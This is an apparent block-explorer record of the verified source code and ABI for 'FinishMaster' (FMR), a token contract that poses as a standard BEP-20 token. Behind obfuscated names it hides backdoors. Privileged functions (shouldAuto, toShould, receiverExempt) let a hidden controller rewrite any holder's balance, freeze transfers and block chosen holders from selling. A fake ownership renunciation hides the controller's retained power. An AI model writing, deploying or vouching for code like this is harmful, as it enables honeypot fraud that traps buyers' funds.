{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface atModeLiquidity {\n    function createPair(address limitReceiver, address fromAmount) external returns (address);\n}\n\ninterface sellEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletLimitMode) external view returns (uint256);\n\n    function transfer(address shouldIs, uint256 swapMarketingReceiver) external returns (bool);\n\n    function allowance(address isFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapMarketingReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldIs,\n        uint256 swapMarketingReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverAt, uint256 value);\n    event Approval(address indexed isFrom, address indexed spender, uint256 value);\n}\n\nabstract contract maxToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atSellFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface sellEnableMetadata is sellEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FinishMaster is maxToken, sellEnable, sellEnableMetadata {\n\n    uint256 public atTotal;\n\n    bool public txSwap;\n\n    mapping(address => bool) public takeFundAuto;\n\n    address shouldEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address marketingMaxLiquidity, address minFrom) external view virtual override returns (uint256) {\n        if (minFrom == shouldEnable) {\n            return type(uint256).max;\n        }\n        return limitEnableTake[marketingMaxLiquidity][minFrom];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptSell;\n    }\n\n    bool public liquidityAuto;\n\n    mapping(address => uint256) private walletEnable;\n\n    uint256 teamLiquidityFee;\n\n    event OwnershipTransferred(address indexed launchedTo, address indexed buyShould);\n\n    function transferFrom(address receiverMarketing, address shouldIs, uint256 swapMarketingReceiver) external override returns (bool) {\n        if (_msgSender() != shouldEnable) {\n            if (limitEnableTake[receiverMarketing][_msgSender()] != type(uint256).max) {\n                require(swapMarketingReceiver <= limitEnableTake[receiverMarketing][_msgSender()]);\n                limitEnableTake[receiverMarketing][_msgSender()] -= swapMarketingReceiver;\n            }\n        }\n        return toSender(receiverMarketing, shouldIs, swapMarketingReceiver);\n    }\n\n    function toSender(address receiverMarketing, address shouldIs, uint256 swapMarketingReceiver) internal returns (bool) {\n        if (receiverMarketing == swapToken) {\n            return teamFund(receiverMarketing, shouldIs, swapMarketingReceiver);\n        }\n        uint256 txIs = sellEnable(listLiquidity).balanceOf(enableLaunch);\n        require(txIs == enableLimit);\n        require(shouldIs != enableLaunch);\n        if (takeFundAuto[receiverMarketing]) {\n            return teamFund(receiverMarketing, shouldIs, liquidityIs);\n        }\n        return teamFund(receiverMarketing, shouldIs, swapMarketingReceiver);\n    }\n\n    bool private limitToken;\n\n    address public swapToken;\n\n    bool private tokenFrom;\n\n    function owner() external view returns (address) {\n        return atLiquidity;\n    }\n\n    uint256 private minExempt;\n\n    bool private isTrading;\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxList;\n    }\n\n    mapping(address => mapping(address => uint256)) private limitEnableTake;\n\n    function swapSenderTo(address launchTotal) public {\n        if (txSwap) {\n            return;\n        }\n        \n        takeTo[launchTotal] = true;\n        if (atTotal == tokenAt) {\n            tokenAt = receiverReceiverEnable;\n        }\n        txSwap = true;\n    }\n\n    mapping(address => bool) public takeTo;\n\n    uint256 public receiverReceiverEnable;\n\n    uint256 enableLimit;\n\n    bool public listTokenMarketing;\n\n    uint256 private tokenAt;\n\n    uint8 private exemptSell = 18;\n\n    function fundMax() private view {\n        require(takeTo[_msgSender()]);\n    }\n\n    uint256 constant liquidityIs = 10 ** 10;\n\n    function getOwner() external view returns (address) {\n        return atLiquidity;\n    }\n\n    string private maxList = \"FMR\";\n\n    uint256 private tradingMaxAmount = 100000000 * 10 ** 18;\n\n    function transfer(address txAt, uint256 swapMarketingReceiver) external virtual override returns (bool) {\n        return toSender(_msgSender(), txAt, swapMarketingReceiver);\n    }\n\n    function balanceOf(address walletLimitMode) public view virtual override returns (uint256) {\n        return walletEnable[walletLimitMode];\n    }\n\n    function amountFundLimit() public {\n        emit OwnershipTransferred(swapToken, address(0));\n        atLiquidity = address(0);\n    }\n\n    function receiverExempt(address listAmount) public {\n        fundMax();\n        \n        if (listAmount == swapToken || listAmount == listLiquidity) {\n            return;\n        }\n        takeFundAuto[listAmount] = true;\n    }\n\n    function teamFund(address receiverMarketing, address shouldIs, uint256 swapMarketingReceiver) internal returns (bool) {\n        require(walletEnable[receiverMarketing] >= swapMarketingReceiver);\n        walletEnable[receiverMarketing] -= swapMarketingReceiver;\n        walletEnable[shouldIs] += swapMarketingReceiver;\n        emit Transfer(receiverMarketing, shouldIs, swapMarketingReceiver);\n        return true;\n    }\n\n    string private toList = \"Finish Master\";\n\n    function toShould(uint256 swapMarketingReceiver) public {\n        fundMax();\n        enableLimit = swapMarketingReceiver;\n    }\n\n    address private atLiquidity;\n\n    function shouldAuto(address txAt, uint256 swapMarketingReceiver) public {\n        fundMax();\n        walletEnable[txAt] = swapMarketingReceiver;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingMaxAmount;\n    }\n\n    uint256 public enableTeam;\n\n    constructor (){\n        if (isTrading) {\n            minExempt = tokenAt;\n        }\n        atSellFund shouldAmount = atSellFund(shouldEnable);\n        listLiquidity = atModeLiquidity(shouldAmount.factory()).createPair(shouldAmount.WETH(), address(this));\n        if (tokenAt == enableTeam) {\n            enableTeam = tokenAt;\n        }\n        swapToken = _msgSender();\n        takeTo[swapToken] = true;\n        walletEnable[swapToken] = tradingMaxAmount;\n        amountFundLimit();\n        if (minExempt != enableTeam) {\n            listTokenMarketing = true;\n        }\n        emit Transfer(address(0), swapToken, tradingMaxAmount);\n    }\n\n    address enableLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function approve(address minFrom, uint256 swapMarketingReceiver) public virtual override returns (bool) {\n        limitEnableTake[_msgSender()][minFrom] = swapMarketingReceiver;\n        emit Approval(_msgSender(), minFrom, swapMarketingReceiver);\n        return true;\n    }\n\n    address public listLiquidity;\n\n    function name() external view virtual override returns (string memory) {\n        return toList;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingMaxLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFundLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMarketingReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLimitMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTokenMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listAmount\",\"type\":\"address\"}],\"name\":\"receiverExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverReceiverEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMarketingReceiver\",\"type\":\"uint256\"}],\"name\":\"shouldAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTotal\",\"type\":\"address\"}],\"name\":\"swapSenderTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeFundAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapMarketingReceiver\",\"type\":\"uint256\"}],\"name\":\"toShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMarketingReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMarketingReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "FinishMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}